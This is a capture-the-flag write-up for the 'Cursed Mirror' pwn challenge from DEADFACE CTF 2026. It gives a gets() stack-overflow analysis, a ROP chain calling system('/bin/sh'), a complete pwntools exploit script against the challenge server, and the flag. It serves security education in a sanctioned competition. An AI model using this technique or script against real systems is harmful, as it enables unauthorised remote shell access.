---
title: "Cursed Mirror"
tags:
  - DEADFACE CTF 2026
  - Pwn
---

# Cursed Mirror

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Pwn |
| **Points** | 150 |
| **Author** | @SpiffyLich |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> Charles again. Excellent work on the last job -- looks like we're about halfway
> through the whole ordeal... that last one led us to a pretty barebones Amazon
> server that just had a single file for download. They're really going for
> obscurity with this one... here's the file for the next phase.

Files given: `Cursed_Mirror` (inside a 513 MB ZIP)
SHA256 (zip): `9160e8c8f931e08461f1d7893f4c410bf347107f5c4321f21492be6f3f22a190`
Remote: `159.65.228.107:5003`

## Solution

### 1. The "513 MB" binary is a bluff

The download is huge, but the ELF itself is tiny — it's padded with a long run of
NUL bytes (the same obscurity trick as the earlier Skeleton Key pwn). Stripping
the padding leaves a ~24 KB x86-64 ELF.

```bash
file Cursed_Mirror
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
head -c 40000 Cursed_Mirror > small.elf   # everything after is NUL padding
```

`checksec`-style facts from `readelf`: executable (no PIE), no stack canary,
and — crucially — the symbol table is intact (`not stripped`).

### 2. Mapping the program

The menu loop (`main` → `print_menu` → `handle_action`) offers three options.
Option **2** ("Ask the Mirror a Question") calls `question()`:

```asm
question:
    sub    rsp, 0x140
    ...
    lea    rax, [rbp-0x40]
    call   gets@plt          ; <-- unbounded read into rbp-0x40
    ...
    call   reflect           ; reverses a copy of the string in place
```

`gets()` into a `rbp-0x40` buffer is a classic stack overflow: **0x48 bytes**
reach the saved return address.

The binary ships its own tools to finish the job:

| Symbol | Address | What it does |
|---|---|---|
| `Enter_The_Mirror(char*)` | `0x40180d` | calls `system(arg)` |
| `reflect(char*)` | `0x401950` | reverses a string in place |
| `gadgets` | `0x401da5` | `pop rdi ; ret` |
| `gadgets+5` | `0x401daa` | bare `ret` (stack align) |

And in `.data` there's a string stored **backwards**:

```
0x406188  string7 = "hs/nib/"   ; "/bin/sh" reversed
```

`reflect("/bin/sh" reversed)` → `"/bin/sh"`, which `Enter_The_Mirror` then
feeds straight to `system()`. The author left us every piece.

### 3. Exploit

Overflow option 2's buffer, reverse the backwards `/bin/sh` in place with
`reflect`, then call `system` on it via `Enter_The_Mirror`:

```
'A'*0x48
+ pop_rdi + string7 + reflect            # "hs/nib/"  ->  "/bin/sh"
+ pop_rdi + string7 + Enter_The_Mirror   # system("/bin/sh")
```

```python
from pwn import *
context(arch='amd64')

pop_rdi = 0x401da5
reflect = 0x401950
mirror  = 0x40180d     # Enter_The_Mirror -> system(rdi)
s7      = 0x406188     # "hs/nib/"  (/bin/sh reversed)

r = remote('159.65.228.107', 5003)
r.sendlineafter(b'seek?:', b'A'*0x48
    + p64(pop_rdi) + p64(s7) + p64(reflect)
    + p64(pop_rdi) + p64(s7) + p64(mirror))
r.sendline(b'')                               # consume the trailing getchar()
r.sendline(b'cat secretflag.txt; exit')
print(r.recvall(timeout=10).decode('latin1'))
```

Pick menu option **2** first, drop the payload, and a shell opens. The hinted
`/home/hackerman/supersecretfile.txt` doesn't exist on the server — the flag is
`secretflag.txt` in the working directory.

!!! note "No stack-align `ret` needed"
    `system()` can choke on a misaligned stack (the `movaps` crash). Here the
    chain already lands 16-byte aligned, so the extra `ret` gadget wasn't
    required — but `0x401daa` is there if you need it.

## Flag

!!! flag "Flag"
    `deadface{M1RR0R_R1M}`

## Takeaways

A multi-hundred-MB download is often just NUL padding — trim it and re-triage
rather than wrestling the whole file. On a non-stripped, no-PIE, no-canary
binary, read the symbol table first: `gets()` plus a `system()` wrapper, a
`pop rdi` gadget and a `/bin/sh` string (even a reversed one with a `reflect`
helper to fix it) is the whole intended ret2system. Let the author's own
functions do the work.
